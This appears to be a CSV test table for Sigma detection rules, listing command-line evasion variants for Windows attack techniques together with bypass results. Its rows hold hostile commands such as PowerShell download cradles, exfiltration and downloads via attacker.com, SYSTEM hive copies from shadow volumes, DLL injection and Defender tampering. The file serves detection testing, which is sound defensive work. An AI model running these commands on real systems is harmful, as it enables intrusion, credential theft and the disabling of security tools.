Technical,Rule_name,Title,Rule_id,Command_match_rule,Commandline_evasion,Excutable,Bypass target rule,Bypass all rule,Trigger rule
t1059.001,proc_creation_win_powershell_susp_parent_process,Suspicious PowerShell Parent Process,754ed792-634f-40ae-b3bc-e0448d33f695,,InstallUtil.exe /logfile= /LogToConsole=false /U CustomPowerShellRunspace.dll,FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_parent_process,Suspicious PowerShell Parent Process,754ed792-634f-40ae-b3bc-e0448d33f695,,"schtasks /create /tn ""TaskBypass"" /tr ""powershell.exe -ExecutionPolicy Bypass -Command Write-Host 'Bypassed'"" /sc once /st 00:00 /f && schtasks /run /tn ""TaskBypass""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_parent_process,Suspicious PowerShell Parent Process,754ed792-634f-40ae-b3bc-e0448d33f695,,"wmic process call create ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command ping 127.0.0.1""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_appdata,PowerShell Script Run in AppData,ac175779-025a-4f12-98b0-acdaeb77ea85,,"powershell.exe -Command ""& {Invoke-Expression (Get-Content $env:LOCALAPPDATA\payload.ps1 -Raw)}""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_appdata,PowerShell Script Run in AppData,ac175779-025a-4f12-98b0-acdaeb77ea85,,"pwsh -c ""& $env:APPDATA\script.ps1""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_appdata,PowerShell Script Run in AppData,ac175779-025a-4f12-98b0-acdaeb77ea85,,"powershell.exe -Command ""& {iex (gc $env:APPDATA\script.ps1 -Raw)}""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -Command ""(New-Object Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -Command ""(New-Object System.Net.Web`Client).DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -Command ""(New-Object System.N'et.WebClient').DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', '$env:TEMP\test.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\t'+'est.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"pwsh.exe -Command ""(New-Object System.Net.WebClient).DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_susp_ps_downloadfile,PowerShell DownloadFile,8f70ac5f-1f6f-4f8e-b454-db19561216c5,,"powershell.exe -Command ""$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://example.com/test.txt', 'C:\test.txt')""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_webclient_casing,Net WebClient Casing Anomalies,c86133ad-4725-4bd0-8170-210788e0a7ba,,powershell.exe -EncodedCommand TgBlAHcALQBPAGIAagBlAGMAdAAgAG4AYABFAHQALgBXAGABRQBiAEMAbABpAEUAbgBUAA==,FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_webclient_casing,Net WebClient Casing Anomalies,c86133ad-4725-4bd0-8170-210788e0a7ba,,powershell.exe -ENC TgBlAHcALQBPAGIAagBlAGMAdAAgAG4AYABFAHQALgBXAGABRQBiAEMAbABpAEUAbgBUAA==,FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_xor_commandline,Suspicious XOR Encoded PowerShell Command,bb780e0c-16cf-4383-8383-1e5471db6cf9,,"powershell.exe -Command ""$plaintext = ([system.Text.Encoding]::UTF8.getBytes(`""Path`n----`nC:\Users\victim""`)) $key = `""abcdefghijklmnopqrstuvwxyz123456`"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; } $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue = $false Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_xor_commandline,Suspicious XOR Encoded PowerShell Command,bb780e0c-16cf-4383-8383-1e5471db6cf9,,"powershell.exe -Command ""`$bytes = 105,102; `$res = ''; `$bytes | % { `$res += [Convert]::ToChar(`$_ -bxor 5) }; Invoke-Expression `$res""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_xor_commandline,Suspicious XOR Encoded PowerShell Command,bb780e0c-16cf-4383-8383-1e5471db6cf9,,"powershell.exe -Command ""`$k=42; `$arr=100,101; `$res=''; `$arr | % { `$res += [string](`$_ -bxor `$k) }; Write-Host `$res""",FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_xor_commandline,Suspicious XOR Encoded PowerShell Command,bb780e0c-16cf-4383-8383-1e5471db6cf9,,powershell.exe -EncodedCommand JABzAGMAcgBpAHAAdAAgAD0AIAAiAC4ALgAuACIAOwAgACQAZABlAGMAbwBkAGUAZAAgAD0AIAAkAHMAYwByAGkAcAB0ACAAfAAgICUAIAB7ACAAWwBjAGgAYQByAF0AKAAkAF8AIAAtAGIAeABvAHIAIAAyADUANQApACAAfQA7ACAASQBFAFgAIAAtAGoAbwBpAG4AIAAkAGQAZQBjAG8AZABlAGQA,FALSE,FALSE,FALSE,
t1059.001,proc_creation_win_powershell_xor_commandline,Suspicious XOR Encoded PowerShell Command,bb780e0c-16cf-4383-8383-1e5471db6cf9,,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File xor_payload.ps1,FALSE,FALSE,FALSE,
t1490,proc_creation_win_cmd_shadowcopy_access,Copy From VolumeShadowCopy Via Cmd.EXE,c73124a7-3e89-44a3-bdc1-25fe4df754b1,,"cmd.exe /c copy ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM"" C:\temp\system.hive",FALSE,FALSE,FALSE,
t1490,proc_creation_win_cmd_shadowcopy_access,Copy From VolumeShadowCopy Via Cmd.EXE,c73124a7-3e89-44a3-bdc1-25fe4df754b1,,cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive,FALSE,FALSE,FALSE,
t1490,proc_creation_win_cmd_shadowcopy_access,Copy From VolumeShadowCopy Via Cmd.EXE,c73124a7-3e89-44a3-bdc1-25fe4df754b1,,cmd.exe /c copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive,FALSE,FALSE,FALSE,
t1490,proc_creation_win_cmd_shadowcopy_access,Copy From VolumeShadowCopy Via Cmd.EXE,c73124a7-3e89-44a3-bdc1-25fe4df754b1,,"cmd.exe /c ""copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system.hive""",FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_adding_generic_creds,New Generic Credentials Added Via Cmdkey.EXE,b1ec66c6-f4d1-4b5c-96dd-af28ccae7727,,"""C:\\WINDOWS\\system32\\cmdkey.exe"" /generic:TERMSRV/THAIMX /user:THAIMX\\thaim /pass:1password2!",FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_adding_generic_creds,New Generic Credentials Added Via Cmdkey.EXE,b1ec66c6-f4d1-4b5c-96dd-af28ccae7727,,"""C:\\WINDOWS\\system32\\cmdkey.exe"" -g TERMSRV/THAIMX -u THAIMX\\thaim -p 1password2!",FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_adding_generic_creds,New Generic Credentials Added Via Cmdkey.EXE,b1ec66c6-f4d1-4b5c-96dd-af28ccae7727,,"""C:\\WINDOWS\\system32\\cmdkey.exe"" -gTERMSRV/THAIMX -uTHAIMX\\thaim -p1password2!",FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_adding_generic_creds,New Generic Credentials Added Via Cmdkey.EXE,b1ec66c6-f4d1-4b5c-96dd-af28ccae7727,,"""C:\\WINDOWS\\system32\\cmdkey.exe"" -u THAIMX\\thaim -g TERMSRV/THAIMX -p 1password2!",FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_adding_generic_creds,New Generic Credentials Added Via Cmdkey.EXE,b1ec66c6-f4d1-4b5c-96dd-af28ccae7727,,"""C:\\WINDOWS\\system32\\cmdkey.exe"" -g TERMSRV/THAIMX -u THAIMX\\thaim -p 1password2!""",FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_recon,Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE,07f8bdc2-c9b3-472a-9817-5a670b872f53,,cmdkey  /list,FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_recon,Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE,07f8bdc2-c9b3-472a-9817-5a670b872f53,,cmdkey /list,FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_recon,Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE,07f8bdc2-c9b3-472a-9817-5a670b872f53,,cmdkey.exe  /list,FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_recon,Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE,07f8bdc2-c9b3-472a-9817-5a670b872f53,,"""cmdkey"" /list",FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_recon,Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE,07f8bdc2-c9b3-472a-9817-5a670b872f53,,cmdkey  /l,FALSE,FALSE,FALSE,
t1003.005,proc_creation_win_cmdkey_recon,Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE,07f8bdc2-c9b3-472a-9817-5a670b872f53,,cmdkey  /L,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe http://attacker.com/file.exe,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe ftp://attacker.com/payload.exe,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe https://attacker.com/malware.exe,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe -Url http://attacker.com/data.exe,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,"ConfigSecurityPolicy.exe ""http://attacker.com/evil.exe""",FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe http://attacker.com/\file.exe,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe http://attacker.com payload.exe,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe http://attacker.com/file.exe --verbose,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe http://attacker.com/file.exe > output.log,FALSE,FALSE,FALSE,
t1567,proc_creation_win_configsecuritypolicy_download_file,Arbitrary File Download Via ConfigSecurityPolicy.EXE,1f0f6176-6482-4027-b151-00071af39d7e,,ConfigSecurityPolicy.exe http://attacker.com/file.exe 2>&1,FALSE,FALSE,FALSE,
t1567,proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil,LOLBAS Data Exfiltration by DataSvcUtil.exe,e290b10b-1023-4452-a4a9-eb31a9013b3a,,DataSvcUtil.exe /uri:http://attacker.com /out:C:\Windows\Temp\proxy.cs /in:C:\Windows\Temp\input.cs,FALSE,FALSE,FALSE,
t1567,proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil,LOLBAS Data Exfiltration by DataSvcUtil.exe,e290b10b-1023-4452-a4a9-eb31a9013b3a,,DataSvcUtil.exe -uri http://attacker.com -out C:\Windows\Temp\proxy.cs -in C:\Windows\Temp\input.cs,FALSE,FALSE,FALSE,
t1567,proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil,LOLBAS Data Exfiltration by DataSvcUtil.exe,e290b10b-1023-4452-a4a9-eb31a9013b3a,,DataSvcUtil.exe /uri:http://attacker.com /out:C:\Windows\Temp\proxy.cs in:C:\Windows\Temp\input.cs,FALSE,FALSE,FALSE,
t1567,proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil,LOLBAS Data Exfiltration by DataSvcUtil.exe,e290b10b-1023-4452-a4a9-eb31a9013b3a,,DataSvcUtil.exe /uri:http://attacker.com out:C:\Windows\Temp\proxy.cs in:C:\Windows\Temp\input.cs,FALSE,FALSE,FALSE,
t1567,proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil,LOLBAS Data Exfiltration by DataSvcUtil.exe,e290b10b-1023-4452-a4a9-eb31a9013b3a,,"DataSvcUtil.exe"" /uri:http://attacker.com /out:C:\Windows\Temp\proxy.cs /in:C:\Windows\Temp\input.cs",FALSE,FALSE,FALSE,
t1218.002,proc_creation_win_control_panel_item,Control Panel Items,0ba863e6-def5-4e50-9cea-4dd8c7dc46a4,,control.exe malicious.cpl,FALSE,FALSE,FALSE,
t1218.002,proc_creation_win_control_panel_item,Control Panel Items,0ba863e6-def5-4e50-9cea-4dd8c7dc46a4,,control.exe payload.dll,FALSE,FALSE,FALSE,
t1218.002,proc_creation_win_control_panel_item,Control Panel Items,0ba863e6-def5-4e50-9cea-4dd8c7dc46a4,,"reg.exe   add   ""HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs""   /v   ""Exploit""   /t   REG_SZ   /d   ""test.cpl""",FALSE,FALSE,FALSE,
t1027.004,proc_creation_win_csc_susp_dynamic_compilation,Dynamic .NET Compilation Via Csc.EXE,dcaa3f04-70c3-427a-80b4-b870d73c94c4,,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /noconfig /fullpaths @""C:\Users\thaim\AppData\Local\Temp\akew4mzz\akew4mzz.cmdline""",FALSE,FALSE,FALSE,
t1027.004,proc_creation_win_csc_susp_dynamic_compilation,Dynamic .NET Compilation Via Csc.EXE,dcaa3f04-70c3-427a-80b4-b870d73c94c4,,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /fullpaths /noconfig @""C:\Users\thaim\AppData\Local\Temp\akew4mzz\akew4mzz.cmdline""",FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_csvde_export,Active Directory Structure Export Via Csvde.EXE,e5d36acd-acb4-4c6f-a13f-9eb203d50099,,csvde.exe -f C:\Users\Public\ad_export.csv,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_csvde_export,Active Directory Structure Export Via Csvde.EXE,e5d36acd-acb4-4c6f-a13f-9eb203d50099,,csvde.exe -fC:\Users\Public\ad_export.csv,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_csvde_export,Active Directory Structure Export Via Csvde.EXE,e5d36acd-acb4-4c6f-a13f-9eb203d50099,,"csvde.exe -f ""C:\Users\Public\ad_export.csv""",FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_csvde_export,Active Directory Structure Export Via Csvde.EXE,e5d36acd-acb4-4c6f-a13f-9eb203d50099,,csvde.exe -f C:\Users\Public\ad_export.csv -i,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_csvde_export,Active Directory Structure Export Via Csvde.EXE,e5d36acd-acb4-4c6f-a13f-9eb203d50099,,csvde.exe -f C:\Users\Public\ad_export.csv -i -f C:\Users\Public\real_export.csv,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_pua_adfind_enumeration,PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE,455b9d50-15a1-4b99-853f-8d37655a4c1b,,cmd.exe /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_pua_adfind_enumeration,PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE,455b9d50-15a1-4b99-853f-8d37655a4c1b,,cmd.exe /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe -sc admincountdmp,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_pua_adfind_enumeration,PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE,455b9d50-15a1-4b99-853f-8d37655a4c1b,,cmd.exe /c C:\AtomicRedTeam\atomics\..\ExternalPayloads\AdFind.exe -sc exchaddresses,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_pua_adfind_enumeration,PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE,455b9d50-15a1-4b99-853f-8d37655a4c1b,,AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_pua_adfind_enumeration,PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE,455b9d50-15a1-4b99-853f-8d37655a4c1b,,adfind.exe -sc admincountdmp,FALSE,FALSE,FALSE,
t1087.002,proc_creation_win_pua_adfind_enumeration,PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE,455b9d50-15a1-4b99-853f-8d37655a4c1b,,adfind.exe -sc exchaddresses,FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_dctask64_arbitrary_command_and_dll_execution,ManageEngine Endpoint Central Dctask64.EXE Potential Abuse,6345b048-8441-43a7-9bed-541133633d7a,,"dctask64.exe -executecmd64 ""whoami""",FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_dctask64_arbitrary_command_and_dll_execution,ManageEngine Endpoint Central Dctask64.EXE Potential Abuse,6345b048-8441-43a7-9bed-541133633d7a,,dctask64.exe -executecmd64:whoami,FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_dctask64_arbitrary_command_and_dll_execution,ManageEngine Endpoint Central Dctask64.EXE Potential Abuse,6345b048-8441-43a7-9bed-541133633d7a,,"dctask64.exe -""execute""cmd64 ""whoami""",FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_dctask64_arbitrary_command_and_dll_execution,ManageEngine Endpoint Central Dctask64.EXE Potential Abuse,6345b048-8441-43a7-9bed-541133633d7a,,"dctask64.exe -executecmd64 ""whoami"" > NUL",FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_dctask64_arbitrary_command_and_dll_execution,ManageEngine Endpoint Central Dctask64.EXE Potential Abuse,6345b048-8441-43a7-9bed-541133633d7a,,dctask64.exe -executecmd64 `echo whoami`,FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_lolbin_mavinject_process_injection,Mavinject Inject DLL Into Running Process,4f73421b-5a0b-4bbf-a892-5a7fb99bea66,,mavinject.exe 1234 /INJECTRUNNING\\tevil.dll,FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_lolbin_mavinject_process_injection,Mavinject Inject DLL Into Running Process,4f73421b-5a0b-4bbf-a892-5a7fb99bea66,,"mavinject.exe 1234 /INJECTRUNNING\""tevil.dll""",FALSE,FALSE,FALSE,
t1055.001,proc_creation_win_lolbin_tracker,Potential DLL Injection Or Execution Using Tracker.exe,148431ce-4b70-403d-8525-fcc2993f29ea,,Tracker.exe /ERRORREPORT:PROMPT /d malicious.dll /c calc.exe,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_defender_remove_context_menu,Windows Defender Context Menu Removed,b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b,,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" | Out-Null",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_defender_remove_context_menu,Windows Defender Context Menu Removed,b9e8c7d6-a5f4-4e3d-8b1a-9f0c8d7e6a5b,,"powershell.exe -Command ""rm 'HKCR\*\shellex\ContextMenuHandlers\EPP'"" -Verb RunAs",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_mpcmdrun_remove_windows_defender_definition,Windows Defender Definition Files Removed,9719a8aa-401c-41af-8108-ced7ec9cd75c,,MpCmdRun.exe -RemoveDefinitions -All,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_mpcmdrun_remove_windows_defender_definition,Windows Defender Definition Files Removed,9719a8aa-401c-41af-8108-ced7ec9cd75c,,MpCmdRun.exe /RemoveDefinitions /All,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_mpcmdrun_remove_windows_defender_definition,Windows Defender Definition Files Removed,9719a8aa-401c-41af-8108-ced7ec9cd75c,,"MpCmdRun.exe"" /RemoveDefinitions /All",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_base64_mppreference,Powershell Base64 Encoded MpPreference Cmdlet,c6fb44c6-71f5-49e6-9462-1425d328aee3,,"powershell.exe -EncodedCommand ""UwBlAHQALQBNAHAARQByAGYAZQByAGUAbgBjAGUAIAAtAEUAeABjAGwAdQBzAGkAbwBuAFAAYQB0AGgAIABDADoAXAB0AGUAcwB0AA==""",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_base64_mppreference,Powershell Base64 Encoded MpPreference Cmdlet,c6fb44c6-71f5-49e6-9462-1425d328aee3,,"powershell.exe -Command ""Set-MpPreference -ExclusionPath 'C:\test'""",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_defender_exclusion,Powershell Defender Exclusion,17769c90-230e-488b-a463-e05c08e9d48f,,"powershell.exe -Command ""Add-MpPreference -ExclusionPath 'C:\\Temp'""",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_defender_exclusion,Powershell Defender Exclusion,17769c90-230e-488b-a463-e05c08e9d48f,,"powershell.exe -Command ""Add-MpPreference -ExclusionPath C:\\Temp\""",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_defender_exclusion,Powershell Defender Exclusion,17769c90-230e-488b-a463-e05c08e9d48f,,"powershell.exe -Command ""Set-MpPreference -ExclusionPath 'C:\\Temp'""",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_defender_av_security_monitoring,Disable Windows Defender AV Security Monitoring,a7ee1722-c3c5-aeff-3212-c777e4733217,,powershell.exe -Command Set-MpPreference -DisableBehaviorMonitoring $true,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_defender_av_security_monitoring,Disable Windows Defender AV Security Monitoring,a7ee1722-c3c5-aeff-3212-c777e4733217,,powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -DisableRuntimeMonitoring $true,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_defender_av_security_monitoring,Disable Windows Defender AV Security Monitoring,a7ee1722-c3c5-aeff-3212-c777e4733217,,powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true | Out-Null,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_defender_av_security_monitoring,Disable Windows Defender AV Security Monitoring,a7ee1722-c3c5-aeff-3212-c777e4733217,,powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -WarningAction SilentlyContinue,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_defender_av_security_monitoring,Disable Windows Defender AV Security Monitoring,a7ee1722-c3c5-aeff-3212-c777e4733217,,powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_defender_av_security_monitoring,Disable Windows Defender AV Security Monitoring,a7ee1722-c3c5-aeff-3212-c777e4733217,,powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -Verbose,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_defender_av_security_monitoring,Disable Windows Defender AV Security Monitoring,a7ee1722-c3c5-aeff-3212-c777e4733217,,powershell.exe Set-MpPreference -DisableBehaviorMonitoring $true -Debug,FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_ie_features,Disabled IE Security Features,fb50eb7a-5ab1-43ae-bcc9-091818cb8424,,"New-ItemProperty -Path ""HKCU\Software\Microsoft\Internet Explorer\Main"" -PropertyType DWord -Name ""DisableFirstRunCustomize"" -Value 2",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_disable_ie_features,Disabled IE Security Features,fb50eb7a-5ab1-43ae-bcc9-091818cb8424,,"Set-ItemProperty -Path ""HKLM\SOFTWARE\Microsoft\Internet Explorer\Main"" -Name ""IEHarden"" -Value 0",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_remove_mppreference,Tamper Windows Defender Remove-MpPreference,07e3cb2c-0608-410d-be4b-1511cb1a0448,,"powershell.exe -Command ""Remove-MpPreference -ControlledFolderAccessProtectedFolders 'C:\'""",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_remove_mppreference,Tamper Windows Defender Remove-MpPreference,07e3cb2c-0608-410d-be4b-1511cb1a0448,,"powershell.exe -Command ""Remove-MpPreference -ControlledFolderAccessProtectedFolders 'C:\'"" -WindowStyle Hidden",FALSE,FALSE,FALSE,
t1562.001,proc_creation_win_powershell_remove_mppreference,Tamper Windows Defender Remove-MpPreference,07e3cb2c-0608-410d-be4b-1511cb1a0448,,"powershell.exe -Command ""& { Remove-MpPreference -ControlledFolderAccessProtectedFolders 'C:\' }""",FALSE,FALSE,FALSE,
